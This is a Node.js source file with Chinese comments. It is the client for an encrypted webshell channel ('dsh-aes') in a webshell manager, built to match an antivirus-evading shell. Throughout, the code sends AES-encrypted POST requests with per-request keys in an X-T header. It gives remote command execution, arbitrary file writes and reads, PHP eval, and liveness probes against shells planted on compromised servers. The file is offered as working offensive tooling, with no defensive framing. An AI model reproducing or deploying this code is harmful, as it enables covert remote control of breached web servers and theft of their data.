// dsh-webshell-mgr 自研加密马通道（dsh-aes）：与免杀侧加密马同协议的客户端复刻。
//   请求：POST 本马；Header X-T = base64( IV(16B) || KEY(16B) )；Body = base64( AES-128-CBC )
//   明文载荷 = 操作码(1B) + 参数：
//     c<命令>              命令执行
//     u|<路径>|<b64内容>   上传写文件
//     d|<路径>             下载读文件
//     e<php代码>           v2 扩展：eval 代码执行（ob 捕获输出）——生成器 v2 模板才有
//   响应：业务 JSON {"code":0,"data":"<base64(结果)>"}；失败静默 404/500。
// 密钥每请求随机（X-T 头携带），无会话态——与马侧实现逐字段对齐。

import { createCipheriv, createDecipheriv, randomBytes } from "node:crypto";
import { httpRequest, b64, unb64 } from "./http-client.js";

function aesCbcEncrypt(key, iv, plaintext) {
	const cipher = createCipheriv("aes-128-cbc", Buffer.from(key), Buffer.from(iv));
	return Buffer.concat([cipher.update(Buffer.from(plaintext)), cipher.final()]);
}

/**
 * 发送一次操作。
 * @param {string} op 明文载荷（操作码+参数）
 * @returns {Buffer} 结果字节（data 字段 base64 解码后）
 */
export async function sendOp(conn, op) {
	const key = randomBytes(16);
	const iv = randomBytes(16);
	const body = b64(aesCbcEncrypt(key, iv, Buffer.from(op, "utf8")));
	const headers = { ...(conn.headers ?? {}), "x-t": b64(Buffer.concat([iv, key])), "content-type": "application/octet-stream" };
	const res = await httpRequest({ url: conn.url, method: "POST", headers, body, timeoutMs: conn.timeoutMs });
	if (res.status !== 200) throw new Error(`马侧静默拒绝（HTTP ${res.status}——密钥/协议不符或马不存在）`);
	let json;
	try { json = JSON.parse(res.bodyBuffer.toString("utf8")); } catch { throw new Error("响应非业务 JSON——协议不匹配"); }
	if (json?.code !== 0) throw new Error(`马侧返回失败：${json?.msg ?? "unknown"}`);
	return unb64(json.data ?? "");
}

/** 命令执行（c 操作码）。 */
export async function cmd(conn, command) {
	const buf = await sendOp(conn, "c" + command);
	return buf.toString("utf8");
}

/** 上传写文件（u 操作码，二进制安全）。 */
export async function writeFile(conn, path, data) {
	await sendOp(conn, `u|${path}|${b64(data)}`);
}

/** 下载读文件（d 操作码，二进制安全）。 */
export async function readFile(conn, path) {
	return sendOp(conn, "d" + path);
}

/** eval PHP 代码（e 操作码，仅 v2 马）。 */
export async function evalPhp(conn, code) {
	const buf = await sendOp(conn, "e" + code);
	return buf.toString("utf8");
}

const probeToken = () => "WSMP" + Math.random().toString(36).slice(2, 10).toUpperCase();

/** 探测：c 操作码回显 token。 */
export async function probe(conn) {
	const token = probeToken();
	try {
		const out = await cmd({ ...conn, timeoutMs: Math.min(conn.timeoutMs, 8000) }, `echo ${token}`);
		return out.includes(token) ? { tokenOutput: out } : null;
	} catch {
		return null;
	}
}

/** v2 能力探测：e 操作码执行 PHP 回显。 */
export async function probeEval(conn) {
	const token = probeToken();
	try {
		const out = await evalPhp({ ...conn, timeoutMs: Math.min(conn.timeoutMs, 8000) }, `echo "${token}";`);
		return out.includes(token);
	} catch {
		return false;
	}
}

export const dshAesCodec = {
	id: "dsh-aes",
	label: "自研加密通道",
	langs: ["php", "jsp", "aspx"],
	caps: { cmd: true, code: "v2", b64rw: true },
	cmd,
	writeFile,
	readFile,
	evalPhp
};
